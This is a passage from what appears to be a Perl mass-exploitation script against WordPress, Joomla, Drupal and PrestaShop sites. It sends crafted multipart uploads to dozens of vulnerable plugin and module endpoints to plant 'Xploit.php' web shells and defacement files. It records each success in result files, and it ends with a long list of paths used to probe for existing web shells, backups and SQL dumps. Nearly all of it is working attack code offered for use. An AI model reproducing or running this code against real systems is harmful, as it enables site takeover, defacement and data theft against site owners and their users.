...
print color('bold green'),"  [LINK] => $site/Xploit.php?X=Xploit\n";
...
print color('bold green'),"  [LINK] => $addblockup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $blazeup\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
...
print color('bold green'),"  [LINK] => $site/wp-content/uploads/_input_3_Xploit.php5?X=Xploit\n";
...
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $catproup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $cherryup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $dmup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $upzzX?X=Xploit\n";
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $levoslideshowup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $zoomerup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $gravityformsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold green'),"  [LINK] => $gravityformsupp\n";
...
print color('bold green'),"  [LINK] => $revsliderajax\n";
open (TEXT, '>>Result/index.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $showbizup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $adsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $sspup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $wpmdup\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $wysijaup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $inbomarketingup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $dzsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $reflexup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
	print colored ("[ Scanning B2J]",'green'),$url."\n";
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $sexycontactup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => ["Xploit.php"]]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $wtffup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"  [LINK] => $jobmangerup\n";
open (TEXT, '>>Result/index.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $phpevup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $Synopticup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $wpshopup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $columnadvertsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $soopamobileup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $soopabannersup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $vtermslideshowup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $simpleslideshowup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $productpageadvertsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $homepageadvertiseup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $homepageadvertise2up?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $jro_homepageadvertiseup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $attributewizardproup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $oneattributewizardproup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $attributewizardproOLDup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $attributewizardpro_xup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $advancedsliderup\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $cartabandonmentproup\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $cartabandonmentproOldup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $videostabup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $wg24themeadministrationup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $fieldvmegamenuup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $wdoptionpanelup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $pk_flexmenuup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $pk_vertflexmenuup?X=Xploit\n";
...
my $response = $ua->post( $url,Content_Type => 'multipart/form-data',Content => [ $field_name => ["nvn_extra_add.php"] ]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $nvn_export_ordersup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
my $response = $ua->post( $url, Content_Type => 'multipart/form-data', Content => [ $field_name => ["Xploit.php.png"] ]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $megamenuup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
my $response = $ua->post( $url,Content_Type => 'multipart/form-data',data => 'bajatax',Content => [ $field_name => ["Xploit.php"] ]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $tdpsthemeoptionpanelup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $psmodthemeoptionpanelup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $masseditproductup?X=Xploit\n\n";
open (TEXT, '>>Result/shell.txt');
...
my $res = $ua->post($vulnurl,Content_Type => 'form-data',Content => ['upload-dir' => './../../','upload-overwrite' => 0,'Filedata' => ["Xploit.gif"],'action' => 'upload'])->decoded_content;
...
$remote = IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>"$site",PeerPort=>80,Timeout=>15);
$def= "$site/Xploit.gif";
...
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(HTTP::Cookies->new(file => 'mycookies.txt',autoTEXT => 1));
...
my $response = $ua->post( $url,Content_Type => 'form-data',Content => [ $field_name => ["Xploit.gif"] ]);
...
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $weblinksup\n";
open (TEXT, '>>Result/index.txt');
...
$drupalink = "http://site.com/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {
...
print "$site => User | $admin Password | $pass\n ";
    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/images/stories/Xploit.php\n";
    close(TEXT);
    }
else{
    print color('bold red');
...
my $response = $ua->post( $url,Content_Type => 'form-data',Content => [ $field_name => ["Xploit.html"] ]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $mediaup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$mediaup\n";
close (TEXT);
$def = $mediaup;
...
my $exploit = $ua->post("$jdup", Cookie => "", 
			Content_Type => "form-data", 
			Content => [ name=>"justin lee", 
			mail=>"ph.hitachi@gmail.com", 
			filetitle =>"justin lee", 
			catlist=>"1", 
			license=>"0", 
			language=>"0", 
			system=>"0",
			file_upload=>["cjd.rar"], 
			pic_upload=>["Xploit.php.php.j"], 
			description=>"<p>hacked</p>", 
			senden=>"Send file", 
			option=>"com_jdownloads", 
			view=>"upload", 
			send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $shellpath\n";
open (TEXT, '>>Result/shell.txt');
...
my $exploitx = $ua->post("$jdup", Cookie => "", 
		Content_Type => "form-data", 
		Content => [ name=>"Justin lee", 
		...
		language=>"0", 
		system=>"0",
		file_upload=>["Xploithtml.rar"], 
		pic_upload=>["Xploit.html.j"], 
		description=>"<p>zot</p>", 
		senden=>"Send file", 
		option=>"com_jdownloads", 
		view=>"upload", 
...
print color('bold green'),"VULN\n";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $def\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
...
my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["Xploit.php"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $comfabrikupp?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $comfabrikup\n";
open (TEXT, '>>Result/index.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $comfabrikupp2?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$comfabrikupp?X=Xploit\n";
close (TEXT);
}else{
...
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $comfabrikup2\n";
open (TEXT, '>>Result/index.txt');
...
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $comadsmanager\n";
open (TEXT, '>>Result/index.txt');
...
my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["Xploit.php"] , submit=>"Upload" ]);
...
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $simplefileuploadsup?X=Xploit\n\n";
open (TEXT, '>>Result/shell.txt');
...
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $uploadfolder\n";
    open(TEXT, '>>Result/shell.txt');
...
print color('reset');
print color('bold white'),"  shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $uploadfolder?X=Xploit\n";
open(TEXT, '>>Result/shell.txt');
...
my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ Filedata=>["Xploit.php"] , 'folder'=>'/components/com_facileforms/libraries/jquery/' ]);
...
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $comjwallpapersup?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $Proclaims?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $Jimtawls?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $NovaSFHs?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $collectors?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $ospropertys?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $ksadvertisers?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $hwdvideoshares?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $fancyss?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold green'),"  [LINK] => $artuploaders?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
...
print color("blue"),"Dorks.txt then run script again and choose 2 or 4 \nyou can get site by grabing site or 5 to \nExract WordPress,Joomla and Drupal etc.\n\n";
...
print "\n";
@path = ('/admin/images/WSO.php',
'/admin/images/dz.php',
'/admin/images/DZ.php',
'/admin/images/cpn.php',
'/admin/images/sos.php',
'/admin/images/term.php',
'/admin/images/Sec-War.php',
'/admin/images/sql.php',
'/admin/images/ssl.php',
'/admin/images/mysql.php',
'/admin/images/WolF.php',
'/admin/images/configuration.php',
'/admin/images/g.php',
'/admin/images/xx.pl',
'/admin/images/ls.php',
'/admin/images/Cpanel.php',
'/admin/images/k.php',
'/admin/images/zone-h.php',
'/admin/images/tmp/user.php',
'/admin/images/tmp/Sym.php',
'/admin/images/cp.php',
'/admin/images/tmp/madspotshell.php',
'/admin/images/tmp/root.php',
'/admin/images/tmp/whmcs.php',
'/admin/images/tmp/index.php',
'/admin/images/tmp/2.php',
'/admin/images/tmp/dz.php',
'/admin/images/tmp/cpn.php',
'/admin/images/tmp/changeall.php',
'/admin/images/tmp/Cgishell.pl',
'/admin/images/tmp/sql.php',
'/admin/images/0day.php',
'/admin/images/tmp/admin.php',
'/admin/images/L3b.php',
'/admin/images/d.php',
'/admin/images/tmp/d.php',
'/admin/images/tmp/L3b.php',
'/admin/images/sado.php',
'/admin/images/admin1.php',
'/admin/images/upload.php',
'/admin/images/up.php',
'/admin/images/vb.zip',
'/admin/images/vb.zip',
'/admin/images/admin2.asp',
'/admin/images/uploads.php',
'/admin/images/sa.php',
'/admin/images/sysadmins/',
'/admin/images/admin1/',
'/admin/images/sniper.php',
'/admin/images/images/Sym.php',
'/admin/images/r57.php',
'/admin/images/gzaa_spysl',
'/admin/images/sql-new.php',
'/admin/images/shell.php',
'/admin/images/sa.php',
'/admin/images/admin.php',
'/admin/images/sa2.php',
'/admin/images/2.php',
'/admin/images/gaza.php',
'/admin/images/up.php',
'/admin/images/upload.php',
'/admin/images/uploads.php',
'/admin/images/shell.php',
'/admin/images/amad.php',
'/admin/images/t00.php',
'/admin/images/dz.php',
'/admin/images/site.zip',
'/admin/images/Black.php',
'/admin/images/site.tar.gz',
'/admin/images/home.zip',
'/admin/images/home.zip',
'/admin/images/home.tar',
'/admin/images/home.tar.gz',
'/admin/images/forum.zip',
'/admin/images/forum.zip',
'/admin/images/forum.tar',
'/admin/images/forum.tar.gz',
'/admin/images/test.txt',
'/admin/images/ftp.txt',
'/admin/images/user.txt',
'/admin/images/site.txt',
'/admin/images/error_log',
'/admin/images/error',
'/admin/images/cpanel',
'/admin/images/awstats',
'/admin/images/site.sql',
'/admin/images/vb.sql',
'/admin/images/forum.sql',
'/admin/images/r00t-s3c.php',
'/admin/images/c.php',
'/admin/images/backup.sql',
'/admin/images/back.sql',
'/admin/images/data.sql',
'/admin/images/wp.zip/',
'/admin/images/asp.aspx',
'/admin/images/tmp/vaga.php',
'/admin/images/tmp/killer.php',
'/admin/images/whmcs.php',
'/admin/images/abuhlail.php',
'/admin/images/tmp/killer.php',
'/admin/images/tmp/domaine.pl',
'/admin/images/tmp/domaine.php',
'/admin/images/useradmin/',
'/admin/images/tmp/d0maine.php',
'/admin/images/d0maine.php',
'/admin/images/tmp/sql.php',
'/admin/images/X.php',
'/admin/images/123.php',
'/admin/images/m.php',
'/admin/images/b.php',
'/admin/images/up.php',
'/admin/images/tmp/dz1.php',
'/admin/images/dz1.php',
'/admin/images/forum.zip',
'/admin/images/Symlink.php',
'/admin/images/Symlink.pl',
'/admin/images/forum.zip',
'/admin/images/joomla.zip',
'/admin/images/joomla.zip',
'/admin/images/wp.php',
'/admin/images/buck.sql',
'/admin/images/sysadmin.php',
'/admin/images/images/c99.php',
'/admin/images/xd.php',
'/admin/images/c100.php',
'/admin/images/spy.aspx',
'/admin/images/xd.php',
'/admin/images/tmp/xd.php',
'/admin/images/sym/root/home/',
'/admin/images/billing/killer.php',
'/admin/images/tmp/upload.php',
'/admin/images/tmp/admin.php',
'/admin/images/Server.php',
'/admin/images/tmp/uploads.php',
'/admin/images/tmp/up.php',
'/admin/images/Server/',
'/admin/images/wp-admin/c99.php',
'/admin/images/tmp/priv8.php',
'/admin/images/priv8.php',
'/admin/images/cgi.pl/',
'/admin/images/tmp/cgi.pl',
'/admin/images/downloads/dom.php',
'/admin/images/webadmin.html',
'/admin/images/admins.php',
'/admin/images/bluff.php',
'/admin/images/king.jeen',
'/admin/images/admins/',
'/admin/images/admins.asp',
'/admin/images/admins.php',
'/admin/images/wp.zip',
'/admin/images/index.php','/images/WSO.php',
'/images/dz.php',
'/images/DZ.php',
'/images/cpanel.php',
'/images/cpn.php',
...
'/admin/images/mysql.php',
'/admin/images/WolF.php',
'/admin/images/madspot.php',
'/admin/images/Cgishell.pl',
'/admin/images/killer.php',
'/admin/images/changeall.php',
'/admin/images/2.php',
'/admin/images/Sh3ll.php',
'/admin/images/dz0.php',
'/admin/images/dam.php',
'/admin/images/user.php',
'/admin/images/dom.php',
'/admin/images/whmcs.php',
'/admin/images/vb.zip',
'/admin/images/r00t.php',
'/admin/images/c99.php',
'/admin/images/gaza.php',
'/admin/images/1.php',
'/admin/images/d0mains.php',
'/admin/images/madspotshell.php',
'/admin/images/info.php',
'/admin/images/egyshell.php',
'/admin/images/Sym.php',
'/admin/images/c22.php',
'/admin/images/c100.php',
'/admin/images/configuration.php',
'/admin/images/g.php',
'/admin/images/xx.pl',
...
$url = $site.$shell;
$req = HTTP::Headers->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success && $response->content =~ /Uname:|server:|Files|sql|Php|symlink|zone-h|Disabled Functions:|upload|choose file/){
